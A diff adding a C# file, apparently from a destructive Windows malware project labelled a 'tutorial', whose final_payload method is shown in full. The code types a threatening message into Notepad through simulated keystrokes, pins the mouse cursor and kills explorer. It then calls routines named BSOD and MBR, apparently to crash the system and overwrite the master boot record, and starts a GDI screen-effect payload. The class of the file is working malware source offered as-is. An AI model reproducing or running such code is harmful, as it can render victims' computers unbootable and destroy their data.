@@ -1,0 +1,88 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace Cluttscape_tutorial
+{
+    public class Final
+    {
+        static string words = "THERE IS NO ESCAPE NOW.DO NOT TRY TO CLOSE THIS WINDOW,YOUR COMPUTER IS NOW DONE FOR ANYWAY."
+        + "DO YOU WANT TO ENJOY THE LAST MINUTES USING YOUR COMPUTER? " + "GOOD LUCK.";
+        public void final_payload()
+        {
+            Process.Start(@"C:\Windows\notepad.exe");
+            Process[] proces_name = Process.GetProcessesByName("notepad");
+            Process[] proces_name2 = Process.GetProcessesByName("explorer");
+            while(proces_name.Length == 0) { }
+            Thread.Sleep(1000);
+            Thread th_mouse = new Thread(mouse_event);
+            th_mouse.Start();
+            char[] word_char = words.ToCharArray();
+            dport.INPUT[] input = new dport.INPUT[2];
+            int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
+            for (int num = 0; num < 150; num++)
+            {                
+                IntPtr find_win = dport.FindWindow("Notepad", null);
+                dport.MoveWindow(find_win, 100, 100, x / 2, y / 3, true);
+
+                UInt16 unicode = word_char[num];
+
+                input[0].type = dport.InputType.INPUT_KEYBOARD;
+                input[0].U.ki.wScan = (dport.ScanCodeShort)unicode;
+                input[0].U.ki.dwFlags = dport.KEYEVENTF.UNICODE;
+
+                input[1].type = dport.InputType.INPUT_KEYBOARD;
+                input[1].U.ki.wVk = dport.VirtualKeyShort.RETURN;
+
+                if(word_char[num] != ',' && word_char[num] != '.' && num != 129)                
+                    dport.SendInput(1, input, Marshal.SizeOf(typeof(dport.INPUT)));               
+                else
+                    dport.SendInput(2, input, Marshal.SizeOf(typeof(dport.INPUT)));
+                Thread.Sleep(200);
+            }
+            while (Convert.ToBoolean(dport.GetKeyState(dport.VirtualKeyStates.VK_RETURN) & dport.KEY_PRESSED)) { }
+            for(int num = 151; num < word_char.Length; num++)
+            {
+                IntPtr find_win = dport.FindWindow("Notepad", null);
+                dport.MoveWindow(find_win, 100, 100, x / 2, y / 3, true);
+
+                UInt16 unicode = word_char[num];
+
+                input[0].type = dport.InputType.INPUT_KEYBOARD;
+                input[0].U.ki.wScan = (dport.ScanCodeShort)unicode;
+                input[0].U.ki.dwFlags = dport.KEYEVENTF.UNICODE;
+
+                dport.SendInput(1, input, Marshal.SizeOf(typeof(dport.INPUT)));
+
+                Thread.Sleep(200);
+            }
+            Thread.Sleep(1000);
+            foreach (Process proc_name in proces_name) { proc_name.Kill(); }
+            foreach (Process proc_name in proces_name2) { proc_name.Kill(); }
+            Process.Start(@"C:\Windows\System32\cmd.exe");
+            Process.Start(@"C:\Windows\System32\mspaint.exe");
+            BSOD.bsod_start();
+            MBR.mbr_start();
+            var gdi = new gdi();
+            Thread th_gdi = new Thread(gdi.gdi_payload);
+            th_gdi.Start();
+            Thread.Sleep(60000);
+            Environment.Exit(-1);
+        }
+        public void mouse_event()
+        {
+            Process[] proces_name = Process.GetProcessesByName("notepad");
+            while(proces_name.Length == 1)
+            {
+                proces_name = Process.GetProcessesByName("notepad");
+                dport.SetCursorPos(300, 300);
+                Thread.Sleep(1);
+            }
+        }
+    }
+}
